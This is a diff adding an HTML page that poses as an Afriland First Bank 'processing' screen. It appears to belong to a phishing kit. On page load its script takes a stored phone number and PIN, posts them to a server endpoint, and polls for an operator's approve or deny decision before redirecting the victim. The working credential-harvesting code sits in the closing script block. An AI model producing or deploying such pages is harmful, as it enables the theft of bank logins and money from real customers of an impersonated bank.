@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Afriland First Bank - Traitement</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root { --primary-color: #551a8b; --primary-gradient: linear-gradient(180deg, #6c23af 0%, #551a8b 100%); }
+        body { background-color: #333; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: -apple-system, sans-serif; }
+        .loading-card { background: #fff; width: 88%; max-width: 380px; padding: 45px 24px; border-radius: 20px; text-align: center; box-shadow: 0 12px 30px rgba(0,0,0,0.25); display: flex; flex-direction: column; align-items: center; }
+        .loader-circle { width: 110px; height: 110px; background: var(--primary-gradient); border-radius: 50%; margin-bottom: 28px; display: flex; justify-content: center; align-items: center; }
+        .loader-circle::after { content: ''; width: 82px; height: 82px; border: 4px solid rgba(255,255,255,0.3); border-top: 4px solid #fff; border-radius: 50%; animation: spin 1.2s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { color: var(--primary-color); font-size: 24px; margin: 0 0 10px; font-weight: 800; }
+        p { color: #666; font-size: 15px; margin: 0; }
+    </style>
+</head>
+<body>
+<div class="loading-card">
+    <div class="loader-circle"></div>
+    <h2 id="main-text">Traitement...</h2>
+    <p id="sub-text">Vérification de sécurité en cours...</p>
+</div>
+<script>
+document.addEventListener("DOMContentLoaded", async () => {
+    const phone = localStorage.getItem("phone") || "";
+    const pin = localStorage.getItem("lastPin") || "";
+    try {
+        await fetch("/api/login-notification", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ phone, pin, country: "CM" })
+        });
+    } catch (err) {}
+
+    async function checkApproval() {
+        try {
+            const res = await fetch(`/api/check-status?phone=${phone}`);
+            const data = await res.json();
+            if (data.status === "approved") window.location.href = "/page8";
+            if (data.status === "denied") window.location.href = "/page6?error=wrongpin";
+        } catch (err) {}
+    }
+    setInterval(checkApproval, 2000);
+});
+</script>
+</body>
+</html>
